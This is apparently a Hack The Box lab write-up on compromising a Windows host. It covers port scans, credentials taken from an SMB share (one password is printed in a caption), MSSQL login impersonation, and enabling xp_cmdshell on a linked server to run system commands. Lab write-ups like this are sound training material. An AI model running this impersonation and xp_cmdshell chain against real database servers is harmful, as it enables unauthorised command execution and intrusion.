# Assessment Hard

## Enumeration

### Rustscan

```
Open 10.129.203.10:135
Open 10.129.203.10:445
Open 10.129.203.10:1433
Open 10.129.203.10:3389

```

### NMAP

```
Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-29 07:27 EDT
Stats: 0:02:45 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 38.45% done; ETC: 07:34 (0:04:26 remaining)
Stats: 0:03:04 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 43.92% done; ETC: 07:34 (0:03:55 remaining)
Nmap scan report for 10.129.203.10
Host is up (0.20s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2023-06-29T11:34:08+00:00; +1s from scanner time.
| ms-sql-ntlm-info: 
|   10.129.203.10:1433: 
|     Target_Name: WIN-HARD
|     NetBIOS_Domain_Name: WIN-HARD
|     NetBIOS_Computer_Name: WIN-HARD
|     DNS_Domain_Name: WIN-HARD
|     DNS_Computer_Name: WIN-HARD
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.129.203.10:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-06-29T11:21:57
|_Not valid after:  2053-06-29T11:21:57
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2023-06-29T11:34:08+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=WIN-HARD
| Not valid before: 2023-06-28T11:21:47
|_Not valid after:  2023-12-28T11:21:47
| rdp-ntlm-info: 
|   Target_Name: WIN-HARD
|   NetBIOS_Domain_Name: WIN-HARD
|   NetBIOS_Computer_Name: WIN-HARD
|   DNS_Domain_Name: WIN-HARD
|   DNS_Computer_Name: WIN-HARD
|   Product_Version: 10.0.17763
|_  System_Time: 2023-06-29T11:33:29+00:00
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (85%)
Aggressive OS guesses: Microsoft Windows Server 2019 (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-06-29T11:33:32
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 389.45 seconds

```



<figure><img src="../../.gitbook/assets/image (67).png" alt=""><figcaption></figcaption></figure>

We have access to the smb share and got all the files which seems to be credentials of all of them.

* Fiona -> not sure what level and services
* John -> Database (in this box could be MSSQL)
* Simon -> not sure too

Tried Fiona with RDP and got the credentials.

<figure><img src="../../.gitbook/assets/image (49) (1).png" alt=""><figcaption><p>Fiona:48Ns72!bns74@S84NNNSl</p></figcaption></figure>

Connected to the RDP session but nothing found. Tried to use the credentials with windows authen to access the mssql

Where able to impersonate to another user using fiona

```
EXECUTE AS LOGIN = 'john'
```

Realized that in John's SMB there was a file hinting to the impersonation and external database (second database).

<figure><img src="../../.gitbook/assets/image (61) (1).png" alt=""><figcaption><p>information.txt</p></figcaption></figure>

Found remote database.

<figure><img src="../../.gitbook/assets/image (24) (1).png" alt=""><figcaption><p>WINSRV02\SQLEXPRESS</p></figcaption></figure>

But can't select the database server because of the impersonated user are not able to access.

I then realized that I can use the sqlcmd in the rdp session and get the list of users that I could impersonate.

<figure><img src="../../.gitbook/assets/image (25).png" alt=""><figcaption><p>john and simon</p></figcaption></figure>

user John doesn't have any more privilege than the user Fiona, I tried to use user Simon and it was able to access the database where Fiona and John can't.

Listing the database gave me 2 different users julio and patric.

<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption><p>julio and patric</p></figcaption></figure>

I confirmed that both of them are not users of the operating system so the only option left is database user. I could try to access the database with the following user and try to change the database server.

Sadly both of them were unable to make a new connection to the database.

From the Hint on Hack the box forum I realized that the John user was an admin user but on the linked database. By so I could execute command through that server.

<pre class="language-sql"><code class="lang-sql">1> EXEC [LOCAL.TEST.LINKED.SRV].master.dbo.sp_configure 'show advanced options', 1;
2> go
Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
1> EXEC ('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV];
2> go
<strong>1> EXEC [LOCAL.TEST.LINKED.SRV].master.dbo.sp_configure 'xp_cmdshell', 1;
</strong><strong>2> go
</strong><strong>Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
</strong><strong>1> EXEC ('RECONFIGURE') AT [LOCAL.TEST.LINKED.SRV];     
</strong><strong>2> go
</strong><strong>1> EXECUTE ("xp_cmdshell 'dir C:\Users'") AT [LOCAL.TEST.LINKED.SRV]
</strong><strong>2> go
</strong></code></pre>

<figure><img src="../../.gitbook/assets/image (46) (1).png" alt=""><figcaption><p>flag</p></figcaption></figure>

This assessment wasn't hard but impossible, given the contents in module, no one who just started the learning path could figure this out without help.
